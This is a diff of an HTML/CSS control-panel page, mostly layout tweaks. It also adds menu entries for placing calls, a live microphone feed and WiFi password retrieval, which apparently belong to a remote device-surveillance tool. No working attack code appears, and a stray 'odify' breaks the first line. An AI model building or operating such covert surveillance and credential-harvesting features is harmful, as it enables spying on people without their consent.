@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+odify <!DOCTYPE html>
 <html ng-app="myappy">
 
 <head>
@@ -44,7 +44,9 @@
             display: flex;
             flex-direction: column;
             height: 100vh;
+            max-height: 100vh;
             background: #0d1117;
+            overflow: hidden;
         }
         
         /* Title Bar */
@@ -52,7 +54,10 @@
             display: flex;
             align-items: center;
             justify-content: space-between;
-            height: 38px;
+            height: 36px;
+            min-height: 36px;
+            max-height: 36px;
+            flex-shrink: 0;
             padding: 0 12px;
             background: var(--bg-secondary);
             border-bottom: 1px solid var(--border-color);
@@ -107,37 +112,56 @@
         .feature-nav-container {
             background: var(--bg-secondary);
             border-bottom: 1px solid var(--border-color);
+            flex-shrink: 0;
+            max-height: 70px;
+            overflow: hidden;
         }
         
         .feature-nav {
             display: flex;
-            gap: 6px;
-            padding: 10px 12px;
+            flex-wrap: nowrap;
+            gap: 4px;
+            padding: 8px 10px;
             overflow-x: auto;
+            overflow-y: hidden;
             -webkit-app-region: no-drag;
+            scrollbar-width: thin;
         }
         
         .feature-nav::-webkit-scrollbar {
             height: 4px;
         }
         
+        .feature-nav::-webkit-scrollbar-track {
+            background: var(--bg-tertiary);
+        }
+        
+        .feature-nav::-webkit-scrollbar-thumb {
+            background: var(--border-color);
+            border-radius: 2px;
+        }
+        
         .feature-nav__item {
             display: flex;
             flex-direction: column;
             align-items: center;
-            gap: 4px;
-            padding: 8px 14px;
-            min-width: 70px;
+            gap: 2px;
+            padding: 6px 10px;
+            min-width: 54px;
+            max-width: 54px;
             background: var(--bg-tertiary);
             border: 1px solid var(--border-color);
             border-radius: var(--radius-md);
             color: var(--text-secondary);
-            font-size: 10px;
+            font-size: 9px;
             font-weight: 500;
             cursor: pointer;
             transition: all 0.15s ease;
             text-decoration: none;
             flex-shrink: 0;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
         }
         
         .feature-nav__item:hover {
@@ -146,7 +170,7 @@
         }
         
         .feature-nav__item i {
-            font-size: 18px;
+            font-size: 16px;
             color: var(--text-secondary);
         }
         
@@ -154,10 +178,17 @@
             color: var(--accent-primary);
         }
         
+        .feature-nav__item span {
+            max-width: 100%;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+        
         /* Content */
         .lab-content {
             flex: 1;
-            padding: 16px;
+            min-height: 0;
+            padding: 12px;
             overflow: hidden;
             -webkit-app-region: no-drag;
         }
@@ -173,12 +204,15 @@
         .lab-view {
             height: 100%;
             overflow: auto;
-            padding: 16px;
+            padding: 12px;
         }
         
         /* Log */
         .lab-log {
-            height: 140px;
+            height: 120px;
+            min-height: 120px;
+            max-height: 120px;
+            flex-shrink: 0;
             background: var(--bg-primary);
             border-top: 1px solid var(--border-color);
             -webkit-app-region: no-drag;
@@ -312,6 +346,18 @@
                 <a class="feature-nav__item" ng-click="goToPage('systemInfo')">
                     <i class="server icon"></i>
                     <span>System</span>
+                </a>
+                <a class="feature-nav__item" ng-click="goToPage('makeCall')">
+                    <i class="phone volume icon"></i>
+                    <span>Call</span>
+                </a>
+                <a class="feature-nav__item" ng-click="goToPage('liveMic')">
+                    <i class="microphone alternate icon"></i>
+                    <span>Live Mic</span>
+                </a>
+                <a class="feature-nav__item" ng-click="goToPage('wifiPasswords')">
+                    <i class="key icon"></i>
+                    <span>WiFi PWD</span>
                 </a>
             </div>
         </div>
